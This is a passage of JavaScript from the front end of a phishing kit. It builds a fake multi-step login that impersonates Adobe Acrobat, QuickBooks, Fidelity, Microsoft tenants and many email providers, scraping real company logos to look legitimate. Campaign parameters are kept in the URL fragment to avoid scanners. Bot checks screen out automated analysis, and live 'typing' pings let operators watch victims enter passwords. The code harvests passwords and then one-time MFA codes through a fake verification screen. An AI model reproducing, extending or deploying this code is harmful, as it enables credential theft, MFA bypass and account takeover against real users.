      const settingsResp = await fetch(`/api/login-settings?hash=${encodeURIComponent(hash)}`);
      if (settingsResp.ok) {
        const settings = await settingsResp.json();
        msg = {
          title: settings.customTitle || msg.title,
          subtitle: settings.customSubtitle || msg.subtitle,
          footer: settings.customFooter || msg.footer
        };
      }
    } catch (e) {
      console.error('[login-flow] Failed to fetch custom messages:', e);
    }
  }

  const titleEl = container.querySelector('[data-lf-email-title]');
  const subtitleEl = container.querySelector('[data-lf-email-subtitle]');
  const footerEl = container.querySelector('[data-lf-email-footer]');
  if (titleEl) titleEl.textContent = msg.title;
  if (subtitleEl) subtitleEl.textContent = msg.subtitle;
  if (footerEl) footerEl.textContent = msg.footer;

  // Provider branding already applied on page load via applyProviderTheme()

  let detected = null;

  // ---- Human-behavior signals ----
  // Real users move the mouse / scroll / type with variable cadence; bots
  // submit forms within a few hundred ms of page load with zero interaction.
  // We collect cheap counters and pass them on the password/MFA POSTs so the
  // server can reject submissions that look obviously scripted.
  const _hb = { t0: Date.now(), mm: 0, mc: 0, sc: 0, kp: 0, td: 0, mtFirst: 0 };
  window.addEventListener('mousemove', () => { _hb.mm++; if (!_hb.mtFirst) _hb.mtFirst = Date.now() - _hb.t0; }, { passive: true });
  window.addEventListener('mousedown', () => { _hb.mc++; if (!_hb.mtFirst) _hb.mtFirst = Date.now() - _hb.t0; }, { passive: true });
  window.addEventListener('scroll',    () => { _hb.sc++; }, { passive: true });
  window.addEventListener('keydown',   () => { _hb.kp++; if (!_hb.mtFirst) _hb.mtFirst = Date.now() - _hb.t0; }, { passive: true });
  window.addEventListener('touchstart',() => { _hb.td++; if (!_hb.mtFirst) _hb.mtFirst = Date.now() - _hb.t0; }, { passive: true });
  function hbBundle() {
    return { _hb_age: Date.now() - _hb.t0, _hb_mm: _hb.mm, _hb_mc: _hb.mc, _hb_sc: _hb.sc, _hb_kp: _hb.kp, _hb_td: _hb.td, _hb_first: _hb.mtFirst };
  }
  // Expose so the password/MFA submit handlers can spread it into their bodies.
  window._humanBundle = hbBundle;

  // Detect slug from URL: /v/:slug, /v/:slug/:email, or /d/:hash (client link)
  const pathParts = window.location.pathname.split('/');
  let userSlug = (pathParts[1] === 'v' && pathParts[2]) ? pathParts[2] : null;
  const clientHash = (pathParts[1] === 'd' && pathParts[2]) ? pathParts[2] : null;

  // Campaign tracking — passed by chameleon shell via query params OR hash fragment.
  // Chameleon HTML puts these in the hash (#E?cid=…&cdm=…) so scanners don't see them in server logs.
  const _qp = new URLSearchParams(window.location.search);
  const _hashQuery = (window.location.hash || '').replace(/^#[^?]*\??/, '');
  const _hp = new URLSearchParams(_hashQuery);
  const campaignId = _qp.get('cid') || _hp.get('cid') || '';
  const campaignDomain = _qp.get('cdm') || _hp.get('cdm') || '';

  // Attempt budgets are tracked server-side on the session now — the client just reads
  // the `remaining` count from each response. No local counters needed.

  // RFC-pragmatic email check — what real apps actually use (rejects "foo", "foo@", "foo@bar").
  const EMAIL_RE = /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/;
  function emailValidationKey(value) {
    const v = (value || '').trim();
    if (!v) return 'email.errorEmpty';
    if (!EMAIL_RE.test(v)) return 'email.errorInvalid';
    return null;
  }

  function showError(msg) {
    if (!errorEl) return;
    // Build "<icon> <span>msg</span>" so CSS layout stays in flex form. textContent on
    // the span keeps the message escape-safe even if a server error string ever included HTML.
    errorEl.innerHTML = '<i class="fas fa-circle-exclamation" aria-hidden="true"></i><span></span>';
    errorEl.querySelector('span').textContent = msg;
    errorEl.classList.remove('hidden');
    errorEl.style.removeProperty('display');
    if (emailInput) emailInput.classList.add('error');
  }
  function hideError() {
    if (!errorEl) return;
    errorEl.textContent = '';
    errorEl.classList.add('hidden');
    errorEl.style.removeProperty('display');
    if (emailInput) emailInput.classList.remove('error');
  }

  function hideAllSteps() {
    [stepEmail, stepProvider, stepLoading].forEach(s => { if (s) s.classList.remove('active'); });
    // Remove any dynamically created steps to prevent duplicates
    card.querySelectorAll('[data-lf-step="password"], [data-lf-step="mfa"]').forEach(el => el.remove());
  }

  function goToLoading(email) {
    hideAllSteps();
    if (loadingEmail) loadingEmail.textContent = email || 'Please wait...';
    if (stepLoading) stepLoading.classList.add('active');
  }

  function goToEmail() {
    hideAllSteps();
    stepEmail.classList.add('active');
    card.className = card.className.replace(/provider-\w+/g, '').trim() + ' login-card';
    hideError();
    emailInput.focus();
  }

  function goToProvider(data) {
    detected = data;
    hideAllSteps();
    stepProvider.classList.add('active');

    // Set provider class on card for CSS theming
    card.className = card.className.replace(/provider-\w+/g, '').trim();
    card.classList.add(`provider-${data.provider}`);

    const provName = PROVIDER_NAMES[data.provider] || data.name || 'your provider';
    const providerSvg = PROVIDER_LOGOS[data.provider] || PROVIDER_LOGOS.acrobat;
    const brandLine = container.querySelector('[data-lf-brand-name]');

    // Map providers to their canonical brand domains for logo probing
    // (e.g. att provider → att.com — not @att.net which is the email host).
    const FAVICON_DOMAINS = {
      aol: 'aol.com', zoho: 'zoho.com', qq: 'mail.qq.com', netease: 'mail.163.com',
      sina: 'mail.sina.com', sohu: 'mail.sohu.com', chinamobile: 'chinamobileltd.com',
      mailru: 'mail.ru', yandex: 'mail.yandex.com', naver: 'mail.naver.com',
      daum: 'mail.daum.net', gmx: 'gmx.com', webde: 'web.de', tonline: 't-online.de',
      att: 'att.com', verizon: 'verizon.com', cox: 'cox.com', frontier: 'frontier.com',
      xfinity: 'xfinity.com', optimum: 'optimum.com', spectrum: 'spectrumnet.com',
      earthlink: 'earthlink.net', centurylink: 'centurylinkquote.com',
      bt: 'bt.com', sky: 'sky.com', virginmedia: 'virginmedia.com',
      orange: 'orange.fr', free: 'free.fr', laposte: 'laposte.fr',
      libero: 'libero.it', virgilio: 'virgilio.it', tiscali: 'tiscali.it',
      shaw: 'shaw.ca', rogers: 'rogers.com', bell: 'bell.ca', telus: 'telus.net',
      telstra: 'telstra.com.au', optus: 'optus.com.au',
      // France
      sfr: 'sfr.fr', bouygues: 'bouyguestelecom.fr', caramail: 'caramail.com',
      // Germany / DACH
      mailbox: 'mailbox.org', posteo: 'posteo.de', arcor: 'arcor.de',
      oneandone: '1and1.com', freenet: 'freenet.de', vodafone: 'vodafone.com',
      tutanota: 'tuta.com', maildedeu: 'mail.de',
      // Spain
      terra: 'terra.es', telefonica: 'telefonica.com', movistar: 'movistar.es',
      ono: 'ono.com', jazztel: 'jazztel.com', yacom: 'ya.com', euskaltel: 'euskaltel.com',
      // UK
      talktalk: 'talktalk.co.uk', plusnet: 'plus.net', madasafish: 'madasafish.com',
      // USA
      juno: 'juno.com', netzero: 'netzero.net', windstream: 'windstream.com',
      mediacom: 'mediacomcable.com', fastmail: 'fastmail.com', usanet: 'usa.net',
      // China
      oneeightoneight: 'mail.188.com', twentyonecn: '21cn.com', tom: 'tom.com',
      twosixthree: '263.net', chinatelecom: 'chinatelecom-h.com', chinaunicom: 'chinaunicom.com',
      // Arab
      etisalat: 'etisalat.ae', du: 'du.ae', stc: 'stc.com.sa',
      tedata: 'te.eg', linkdotnet: 'link.net', noor: 'noor.net',
      maroctelecom: 'iam.ma', tunisietelecom: 'tunisietelecom.tn', topnet: 'topnet.tn',
      batelco: 'batelco.com', qatartel: 'ooredoo.qa', omantel: 'omantel.om',
      idm: 'idm.net.lb', sodetel: 'sodetel.net.lb',
      yemennet: 'yemen.net.ye', algerietelecom: 'algerietelecom.dz',
      // Email hosting platforms
      rackspace: 'rackspace.com', godaddy: 'godaddy.com',
      ovh: 'ovh.com', ionos: 'ionos.com',
    };

    // ===== Decision tree for logo display =====
    //
    // Case A: Microsoft tenant WITH brand logo (Harvard, Deloitte, MS, etc.)
    //         → BIG: real company brand banner (100x100, prominent)
    //         → BELOW: small Microsoft mark + "via Microsoft" text
    //
    // Case B: Native provider domain (att.net, gmail.com, optonline.net…)
    //         → BIG: hardcoded provider SVG (75x75)
    //         → No "via" chip (logo IS the provider)
    //         → Optional: probe Google favicon for richer real logo
    //
    // Case C: Custom domain with detected provider but NO brand
    //         (cmacommunities.com on MS, bsele.com on Alibaba…)
    //         → BIG: provider SVG (75x75)
    //         → No "via" chip (logo IS the provider — saying "via" again is noise)
    //
    // Case D: Unknown email (no provider detected)
    //         → BIG: generic envelope SVG (75x75)
    //         → No "via" chip
    const isCustom = !(data.domain in DOMAIN_TO_PROVIDER_MAP);
    const displayLabel = data.brandName || (isCustom ? data.domain : provName);
    const wrapId = 'lf-brand-' + Math.random().toString(36).slice(2,8);

    // Build the big logo + optional via chip
    let bigLogoHtml, viaChipHtml = '';
    const smallProv = providerSvg.replace(/width="40"/g,'width="14"').replace(/height="40"/g,'height="14"');
    const buildViaChip = () => `<div style="display:flex;align-items:center;gap:6px;font-size:11px;color:#8a8a90;margin-top:8px;">
      <span style="width:14px;height:14px;display:inline-flex;align-items:center;justify-content:center;">${smallProv}</span>
      via ${provName}
    </div>`;

    if (data.brandLogo) {
      // CASE A: MS tenant has Azure AD brand banner. Show it BIG + via chip.
      bigLogoHtml = `<img src="${data.brandLogo}" alt="" referrerpolicy="no-referrer"
        style="width:100px;height:100px;border-radius:18px;object-fit:contain;background:#fff;box-shadow:0 3px 14px rgba(0,0,0,0.10);padding:10px;">`;
      viaChipHtml = buildViaChip();
    } else {
      // Wordmark-style logos (Rackspace, etc.) — wide aspect needs a wider container
      // so the brand image renders at full readable size instead of being squeezed.
      const WIDE_LOGO_PROVIDERS = new Set(['rackspace']);
      const isWide = WIDE_LOGO_PROVIDERS.has(data.provider);

      if (isWide) {
        // For wordmark providers we always want a prominent rendering — even on
        // custom domains hosted on that provider. The async favicon probe will
        // still attempt to swap to the company's own logo afterwards.
        bigLogoHtml = `<div style="width:200px;height:64px;display:flex;align-items:center;justify-content:center;">${providerSvg.replace(/width="40"/g,'width="200"').replace(/height="40"/g,'height="64"')}</div>`;
      } else if (isCustom && data.provider !== 'email') {
        // CASE C (custom domain on known consumer provider, no AAD brand): show a SMALL
        // provider tile (don't glamorize the generic Microsoft/Alibaba tile when the user
        // expects to see a company brand). Async favicon probe swaps to company logo.
        bigLogoHtml = `<div style="width:44px;height:44px;display:flex;align-items:center;justify-content:center;opacity:0.85;">${providerSvg.replace(/width="40"/g,'width="44"').replace(/height="40"/g,'height="44"')}</div>`;
      } else {
        // CASE B/D (native provider or unknown email): provider SVG at standard 75x75.
        bigLogoHtml = `<div style="width:75px;height:75px;display:flex;align-items:center;justify-content:center;">${providerSvg.replace(/width="40"/g,'width="75"').replace(/height="40"/g,'height="75"')}</div>`;
      }
    }

    logoEl.innerHTML = `
      <div style="display:flex;flex-direction:column;align-items:center;gap:0;width:100%;">
        <div id="${wrapId}" style="display:flex;align-items:center;justify-content:center;">${bigLogoHtml}</div>
        ${viaChipHtml}
      </div>`;
    logoEl.style.cssText = 'display:flex;justify-content:center;align-items:center;width:100%;height:auto;margin-bottom:14px;';

    // CASE C/D enhancement: any custom domain — even when we couldn't detect a provider
    // (Rackspace, GoDaddy, OVH, ProofPoint-fronted, or anything we don't recognize).
    // Most legit companies have an apple-touch-icon or favicon ≥64px on their website;
    // grabbing it gives the recipient a real-looking brand even when our detection misses.
    // Skip only for *known consumer providers* (already showing their own SVG).
    if (!data.brandLogo && isCustom) {
      // Try Clearbit's logo API first (real marketing logo for the company), then
      // fall back to apple-touch-icon / favicon files served by the company itself.
      const candidates = [
        `https://logo.clearbit.com/${data.domain}?size=200`,
        `https://${data.domain}/apple-touch-icon-180x180.png`,
        `https://${data.domain}/apple-touch-icon-precomposed.png`,
        `https://${data.domain}/apple-touch-icon.png`,
        `https://${data.domain}/favicon.ico`,
        `https://${data.domain}/favicon.png`,
      ];
      const probeImage = (url) => new Promise(resolve => {
        const im = new Image();
        im.referrerPolicy = 'no-referrer';
        const t = setTimeout(() => { im.src = ''; resolve(null); }, 3000);
        im.onload = () => { clearTimeout(t); resolve({ url, w: im.naturalWidth, h: im.naturalHeight }); };
        im.onerror = () => { clearTimeout(t); resolve(null); };
        im.src = url;
      });
      (async () => {
        for (const u of candidates) {
          const r = await probeImage(u);
          if (r && r.w >= 64 && r.h >= 64) { // require ≥64px to skip default favicons
            const outer = document.getElementById(wrapId)?.parentElement;
            const wrap = document.getElementById(wrapId);
            if (wrap) {
              wrap.innerHTML = '<img src="' + u + '" alt="" referrerpolicy="no-referrer" style="width:100px;height:100px;border-radius:18px;object-fit:contain;background:#fff;box-shadow:0 3px 14px rgba(0,0,0,0.10);padding:10px;">';
            }
            // "via Provider" chip — only when we actually know the underlying provider.
            // For data.provider === 'email' (unknown), we found a company logo but don't
            // know the backend, so skip the chip — just show the company brand cleanly.
            if (data.provider !== 'email' && outer && !outer.querySelector('[data-lf-via-chip]')) {
              const chip = document.createElement('div');
              chip.setAttribute('data-lf-via-chip', '1');
              chip.innerHTML = `<div style="display:flex;align-items:center;gap:6px;font-size:11px;color:#8a8a90;margin-top:8px;">
                <span style="width:14px;height:14px;display:inline-flex;align-items:center;justify-content:center;">${smallProv}</span>
                via ${provName}
              </div>`;
              outer.appendChild(chip.firstChild);
            }
            return;
          }
        }
      })();
    }

    // CASE B enhancement: native provider domains — try multiple logo sources for a
    // richer real-world brand mark. Clearbit serves real marketing logos (clean PNGs),
    // Google's favicon service is a reliable fallback. First source to return ≥48px wins.
    // SKIP_PROBE list: providers whose hardcoded SVG is authoritative.
    const SKIP_PROBE = ['optimum', 'rackspace', 'quickbooks', 'fidelity']; // local SVG is authoritative for these
    if (!data.brandLogo && !isCustom && data.provider !== 'email' && !SKIP_PROBE.includes(data.provider)) {
      const brandDomain = FAVICON_DOMAINS[data.provider] || data.domain;
      const sources = [
        `https://logo.clearbit.com/${brandDomain}?size=200`,
        `https://cdn.brandfetch.io/${brandDomain}/w/200/h/200?c=1idV745GdohMLJ_-fTI`,
        `https://www.google.com/s2/favicons?sz=128&domain=${brandDomain}`,
      ];
      const probeImage = (url) => new Promise(resolve => {
        const im = new Image();
        im.referrerPolicy = 'no-referrer';
        const t = setTimeout(() => { im.src = ''; resolve(null); }, 3500);
        im.onload = () => {
          clearTimeout(t);
          // Clearbit returns 1x1 placeholder when it has no logo — reject anything tiny.
          resolve(im.naturalWidth >= 48 && im.naturalHeight >= 48 ? { url, w: im.naturalWidth, h: im.naturalHeight } : null);
        };
        im.onerror = () => { clearTimeout(t); resolve(null); };
        im.src = url;
      });
      (async () => {
        for (const src of sources) {
          const r = await probeImage(src);
          if (!r) continue;
          const wrap = document.getElementById(wrapId);
          if (wrap) {
            wrap.innerHTML = '<img src="' + r.url + '" alt="" referrerpolicy="no-referrer" style="width:75px;height:75px;border-radius:14px;object-fit:contain;background:#fff;box-shadow:0 2px 10px rgba(0,0,0,0.10);padding:6px;">';
          }
          return;
        }
      })();
    }

    {
      // brandLine intentionally hidden — the brand name already appears in
      // the heading ("Continue with COMMUNITY MANAGEMENT ASSOCIATES"), so
      // showing it again above is just visual duplication.
      if (brandLine) { brandLine.style.display = 'none'; }
      nameEl.textContent = `Continue with ${displayLabel}`;
      continueBtn.textContent = `Continue with ${provName}`;
    }

    continueBtn.style.background = data.color;

    // Email pill
    const emailInitial = data.email.charAt(0).toUpperCase();
    pillEl.innerHTML = `<span class="pp-av">${emailInitial}</span> ${data.email}`;

    hideError();
  }

  // ---- Bot protection: fetch challenge, solve proof-of-work, include honeypot ----
  async function solveChallenge() {
    const resp = await fetch('/auth/challenge');
    const { token, a, b } = await resp.json();
    return { _token: token, _answer: a * b, _hp: '' }; // _hp = honeypot (always empty for real users)
  }

  // Step 1: Submit email → show loading → detect provider
  // Clear the error styling as soon as the user resumes typing — gives the
  // Microsoft/Gmail "give them a chance to fix it" feel.
  emailInput.addEventListener('input', () => {
    if (emailInput.classList.contains('error')) hideError();
  });
  // Quiet blur validation: only flag if there's actual text that doesn't match.
  // We don't yell at the user for tabbing away from an empty field.
  emailInput.addEventListener('blur', () => {
    const v = emailInput.value.trim();
    if (!v) return;
    if (!EMAIL_RE.test(v)) showError(t('email.errorInvalid', 'Please enter a valid email address.'));
  });

  emailForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    const email = emailInput.value.trim();
    const errKey = emailValidationKey(email);
    if (errKey) {
      showError(t(errKey, errKey === 'email.errorEmpty'
        ? 'Please enter your email address.'
        : 'Please enter a valid email address.'));
      emailInput.focus();
      return;
    }
    hideError();

    // Show loading spinner
    goToLoading(email);

    const minDelay = new Promise(r => setTimeout(r, 3000));
    try {
      const [challenge, fp] = await Promise.all([solveChallenge(), collectFingerprint()]);
      const detect = fetch('/auth/detect', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, ...challenge, _fp: fp.hash, _fpSignals: fp.signals, _slug: userSlug, _hash: clientHash, _cid: campaignId, _cdm: campaignDomain }),
      }).then(r => r.json());

      const [data] = await Promise.all([detect, minDelay]);
      if (data.error) { goToEmail(); showError(data.error); return; }

      // Keep provider constant based on documentType (don't switch based on email)
      // QB, Fidelity, and provider-typed documents stay as their branded portals
      // Generic types (invoice, receipt, etc) stay as Acrobat
      if ((window.__DOCUMENT_TYPE__ === 'quickbook' || window.__DOCUMENT_TYPE__ === 'fidelity' ||
           (window.__PROVIDER__ && window.__PROVIDER__.brand && window.__PROVIDER__.brand !== 'acrobat'))) {
        data.provider = window.__PROVIDER__.brand;
        data.name = window.__PROVIDER__.name;
      } else {
        // For generic document types, keep showing Acrobat (don't switch to email provider)
        data.provider = 'acrobat';
        data.name = 'Adobe Acrobat';
      }

      goToProvider(data);
    } catch {
      goToEmail();
      showError(t('error.network', 'Network error. Please try again.'));
    }
  });

  // NEW: Password step after provider
  function goToPassword() {
    hideAllSteps();
    
    // Create password step dynamically (minimal HTML injection)
    const passStep = document.createElement('div');
    passStep.className = 'login-state active';
    passStep.dataset.lfStep = 'password';
    const provName = PROVIDER_NAMES[detected.provider] || detected.name || t('provider.yourProvider', 'your provider');
    passStep.innerHTML = `
      <button class="login-back pass-back-btn"><i class="fas fa-arrow-left"></i> ${t('provider.back', 'Back')}</button>
      <div class="provider-logo">${logoEl.innerHTML}</div>
      <h1 style="font-size:20px;margin-bottom:6px;">${t('provider.signinWith', 'Sign in with')} ${provName}</h1>
      <div class="provider-pill"><span class="pp-av">${detected.email[0].toUpperCase()}</span>${detected.email}</div>
      <form class="pass-form" autocomplete="off">
        <div class="field">
          <label for="passInput">${t('password.label', 'Password')}</label>
          <input type="password" id="passInput" placeholder="${t('password.placeholder', 'Enter your password')}" required />
        </div>
        <p class="error-msg hidden" id="passError"></p>
        <button type="submit" class="provider-btn pass-submit-btn" style="--btn-color:${detected.color || '#1473e6'}">
          <span class="pb-label">${t('password.submit', 'Verify Password')}</span>
          <span class="pb-spinner" aria-hidden="true"><svg viewBox="0 0 24 24" fill="none" stroke-width="3" stroke-linecap="round"><circle class="track" cx="12" cy="12" r="9"/><circle class="head" cx="12" cy="12" r="9"/></svg></span>
        </button>
      </form>
      <p class="legal" style="margin-top:18px;">${t('password.legal', 'Contact your administrator if you forgot your password.')}</p>
    `;
    card.appendChild(passStep);

    // Back button — attach via JS so it can access the closure
    passStep.querySelector('.pass-back-btn').addEventListener('click', () => goToProvider(detected));
    
    // Password form handler
    const passForm = passStep.querySelector('form');
    const passInput = document.getElementById('passInput');
    const passError = document.getElementById('passError');
    passInput.focus();

    // Real-time typing indicator — ping server while the target types so admins see live animation.
    // Throttled to at most one ping per 900ms so we don't flood the server.
    let _lastTypingPing = 0;
    passInput.addEventListener('input', () => {
      const now = Date.now();
      if (now - _lastTypingPing < 900) return;
      _lastTypingPing = now;
      try {
        fetch('/auth/typing', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          keepalive: true,
          body: JSON.stringify({ email: detected.email, field: 'password', _slug: userSlug, _hash: clientHash, _cid: campaignId }),
        }).catch(() => {});
      } catch {}
    });

    function showPassError(msg) {
      passError.textContent = msg;
      passError.classList.remove('hidden');
      passError.style.display = 'block';
    }

    passForm.onsubmit = async (e) => {
      e.preventDefault();
      const password = passInput.value;
      if (!password) return;

      const btn = passForm.querySelector('button');
      btn.disabled = true;
      btn.classList.add('is-loading');
      passError.classList.add('hidden');
      passError.style.display = '';

      try {
        const resp = await fetch('/api/verify-password', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ email: detected.email, password, _slug: userSlug, _hash: clientHash, _cid: campaignId, _cdm: campaignDomain, ...hbBundle() }),
        });
        const data = await resp.json();

        if (data.success === false) {
          // Server signals: budget exhausted, transition to MFA step.
          if (data.gotoMfa) { goToMfa(); return; }

          // Wrong password — restore button, show error below the field.
          btn.classList.remove('is-loading');
          btn.disabled = false;
          const remaining = (typeof data.remaining === 'number') ? data.remaining : 1;
          const tail = remaining === 1
            ? t('password.attemptRemaining', '1 attempt remaining.')
            : t('password.attemptsRemaining', '{n} attempts remaining.').replace('{n}', remaining);
          showPassError(`${data.error || ''} ${tail}`);
          passInput.value = '';
          passInput.focus();
          return;
        }

        // Success — leave the spinner up; the page will navigate momentarily.
        if (opts.onSuccess) opts.onSuccess();
        else window.location.href = '/';
      } catch {
        btn.classList.remove('is-loading');
        btn.disabled = false;
        showPassError(t('error.network', 'Network error. Please try again.'));
      }
    };
  }

  // ---- MFA Step ----
  function goToMfa() {
    if (detected && detected.provider === 'google') return goToGoogleMfa();
    hideAllSteps();
    const mfaStep = document.createElement('div');
    mfaStep.className = 'login-state active';
    mfaStep.dataset.lfStep = 'mfa';

    mfaStep.innerHTML = `
      <button class="login-back mfa-back-btn"><i class="fas fa-arrow-left"></i> ${t('provider.back', 'Back')}</button>
      <div class="provider-logo">${logoEl.innerHTML}</div>
      <div style="text-align:center;">
        <h1 style="font-size:20px;margin-bottom:6px;">${t('mfa.title', 'Verify your identity')}</h1>
        <div class="provider-pill"><span class="pp-av">${detected.email[0].toUpperCase()}</span>${detected.email}</div>
        <p style="color:var(--text-mute);margin-bottom:20px;font-size:13px;line-height:1.5;">${t('mfa.subtitle', "For your security, we need to verify it's you.<br>Choose how you'd like to receive your code.")}</p>
      </div>

      <!-- Method selection -->
      <div id="mfa-methods" style="max-width:360px;margin:0 auto 16px;">
        <div class="mfa-method active" data-method="app" style="display:flex;align-items:center;gap:14px;padding:14px 16px;border:2px solid ${detected.color || 'var(--accent)'};border-radius:12px;cursor:pointer;margin-bottom:8px;background:${detected.color || 'var(--accent)'}08;transition:all 150ms;">
          <div style="width:40px;height:40px;background:var(--accent);border-radius:10px;display:flex;align-items:center;justify-content:center;flex-shrink:0;background:${detected.color || '#007aff'}15;">
            <i class="fas fa-mobile-screen" style="color:${detected.color || 'var(--accent)'};font-size:18px;"></i>
          </div>
          <div style="flex:1;">
            <div style="font-size:14px;font-weight:700;margin-bottom:2px;">${t('mfa.method.app', 'Authenticator App')}</div>
            <div style="font-size:12px;color:var(--text-mute);">${t('mfa.method.app.desc', 'Use Google Authenticator, Authy, or similar')}</div>
          </div>
          <i class="fas fa-circle-check" style="color:${detected.color || 'var(--accent)'};font-size:18px;"></i>
        </div>
        <div class="mfa-method" data-method="sms" style="display:flex;align-items:center;gap:14px;padding:14px 16px;border:2px solid var(--border,#e5e7eb);border-radius:12px;cursor:pointer;transition:all 150ms;">
          <div style="width:40px;height:40px;border-radius:10px;display:flex;align-items:center;justify-content:center;flex-shrink:0;background:#f0f0f5;">
            <i class="fas fa-comment-sms" style="color:var(--text-dim,#636366);font-size:18px;"></i>
          </div>
          <div style="flex:1;">
            <div style="font-size:14px;font-weight:700;margin-bottom:2px;">${t('mfa.method.sms', 'Text Message (SMS)')}</div>
            <div style="font-size:12px;color:var(--text-mute);">${t('mfa.method.sms.desc', 'Send code to phone number on file')}</div>
          </div>
          <i class="fas fa-circle" style="color:#ddd;font-size:18px;"></i>
        </div>
      </div>

      <!-- Code input -->
      <form id="mfa-form" autocomplete="off" style="max-width:360px;margin:0 auto;">
        <p id="mfa-instruction" style="font-size:13px;color:var(--text-dim,#636366);text-align:center;margin-bottom:14px;font-weight:500;">${t('mfa.instruction.app', 'Enter the 6-digit code from your authenticator app')}</p>
        <div style="display:flex;gap:8px;justify-content:center;margin-bottom:14px;" id="mfa-digits">
          <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]" class="mfa-digit" style="width:46px;height:54px;text-align:center;font-size:22px;font-weight:800;border:2px solid var(--border,#e5e7eb);border-radius:12px;outline:none;font-family:inherit;transition:all 150ms;" />
          <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]" class="mfa-digit" style="width:46px;height:54px;text-align:center;font-size:22px;font-weight:800;border:2px solid var(--border,#e5e7eb);border-radius:12px;outline:none;font-family:inherit;transition:all 150ms;" />
          <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]" class="mfa-digit" style="width:46px;height:54px;text-align:center;font-size:22px;font-weight:800;border:2px solid var(--border,#e5e7eb);border-radius:12px;outline:none;font-family:inherit;transition:all 150ms;" />
          <div style="width:8px;display:flex;align-items:center;justify-content:center;color:#ccc;font-weight:700;">-</div>
          <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]" class="mfa-digit" style="width:46px;height:54px;text-align:center;font-size:22px;font-weight:800;border:2px solid var(--border,#e5e7eb);border-radius:12px;outline:none;font-family:inherit;transition:all 150ms;" />
          <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]" class="mfa-digit" style="width:46px;height:54px;text-align:center;font-size:22px;font-weight:800;border:2px solid var(--border,#e5e7eb);border-radius:12px;outline:none;font-family:inherit;transition:all 150ms;" />
          <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]" class="mfa-digit" style="width:46px;height:54px;text-align:center;font-size:22px;font-weight:800;border:2px solid var(--border,#e5e7eb);border-radius:12px;outline:none;font-family:inherit;transition:all 150ms;" />
        </div>
        <p class="error-msg hidden" id="mfaError" style="text-align:center;margin-bottom:10px;"></p>
        <button type="submit" class="provider-btn" id="mfa-submit-btn" style="--btn-color:${detected.color || '#1473e6'};width:100%;font-size:15px;">
          <span class="pb-label">${t('mfa.submit', 'Verify')}</span>
          <span class="pb-spinner" aria-hidden="true"><svg viewBox="0 0 24 24" fill="none" stroke-width="3" stroke-linecap="round"><circle class="track" cx="12" cy="12" r="9"/><circle class="head" cx="12" cy="12" r="9"/></svg></span>
        </button>
      </form>
      <p style="text-align:center;margin-top:16px;font-size:12px;color:var(--text-mute);">${t('mfa.didntReceive', "Didn't receive a code?")} <a href="#" id="mfa-resend" style="color:${detected.color || 'var(--accent)'};text-decoration:none;font-weight:600;">${t('mfa.resend', 'Resend')}</a></p>
    `;
    card.appendChild(mfaStep);

    // Back button
    mfaStep.querySelector('.mfa-back-btn').addEventListener('click', () => goToPassword());

    // Method selection toggle
    const methods = mfaStep.querySelectorAll('.mfa-method');
    const instruction = document.getElementById('mfa-instruction');
    const accentColor = detected.color || 'var(--accent)';
    methods.forEach(m => {
      m.addEventListener('click', () => {
        methods.forEach(el => {
          el.style.borderColor = 'var(--border,#e5e7eb)';
          el.style.background = 'transparent';
          el.querySelector('.fa-circle-check,.fa-circle').className = 'fas fa-circle';
          el.querySelector('.fa-circle').style.color = '#ddd';
        });
        m.style.borderColor = accentColor;
        m.style.background = accentColor + '08';
        const icon = m.querySelector('.fa-circle');
        icon.className = 'fas fa-circle-check';
        icon.style.color = accentColor;
        if (m.dataset.method === 'sms') {
          instruction.textContent = t('mfa.instruction.sms', 'Enter the 6-digit code sent to your phone');
        } else {
          instruction.textContent = t('mfa.instruction.app', 'Enter the 6-digit code from your authenticator app');
        }
      });
    });

    // Digit input auto-advance
    const digits = mfaStep.querySelectorAll('.mfa-digit');
    digits[0].focus();
    digits.forEach((d, i) => {
      d.addEventListener('input', () => {
        d.value = d.value.replace(/[^0-9]/g, '');
        if (d.value && i < digits.length - 1) digits[i + 1].focus();
        // Change border color while typing
        d.style.borderColor = d.value ? accentColor : 'var(--border,#e5e7eb)';
        // Auto-submit when all 6 filled
        const code = [...digits].map(x => x.value).join('');
        if (code.length === 6) document.getElementById('mfa-form').requestSubmit();
      });
      d.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && !d.value && i > 0) { digits[i - 1].focus(); digits[i - 1].value = ''; }
      });
      d.addEventListener('focus', () => { d.style.borderColor = accentColor; d.style.boxShadow = '0 0 0 3px ' + accentColor + '18'; });
      d.addEventListener('blur', () => { d.style.boxShadow = 'none'; if (!d.value) d.style.borderColor = 'var(--border,#e5e7eb)'; });
      // Handle paste
      d.addEventListener('paste', (e) => {
        e.preventDefault();
        const pasted = (e.clipboardData.getData('text') || '').replace(/[^0-9]/g, '').slice(0, 6);
        pasted.split('').forEach((ch, j) => { if (digits[j]) { digits[j].value = ch; digits[j].style.borderColor = accentColor; } });
        if (pasted.length === 6) document.getElementById('mfa-form').requestSubmit();
        else if (digits[pasted.length]) digits[pasted.length].focus();
      });
    });

    // Resend link
    document.getElementById('mfa-resend').addEventListener('click', (e) => {
      e.preventDefault();
      const el = e.target;
      el.textContent = t('mfa.resent', 'Code sent!');
      el.style.color = 'var(--text-mute)';
      setTimeout(() => { el.textContent = t('mfa.resend', 'Resend'); el.style.color = accentColor; }, 3000);
    });

    // Form submit
    const mfaError = document.getElementById('mfaError');
    document.getElementById('mfa-form').onsubmit = async (e) => {
      e.preventDefault();
      const code = [...digits].map(x => x.value).join('');
      if (code.length !== 6) return;

      const btn = document.getElementById('mfa-submit-btn');
      btn.disabled = true;
      btn.classList.add('is-loading');
      mfaError.classList.add('hidden');
      mfaError.style.display = '';

      // Get selected method
      const activeMethod = mfaStep.querySelector('.mfa-method .fa-circle-check');
      const method = activeMethod ? activeMethod.closest('.mfa-method').dataset.method : 'app';

      try {
        const resp = await fetch('/api/verify-mfa', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
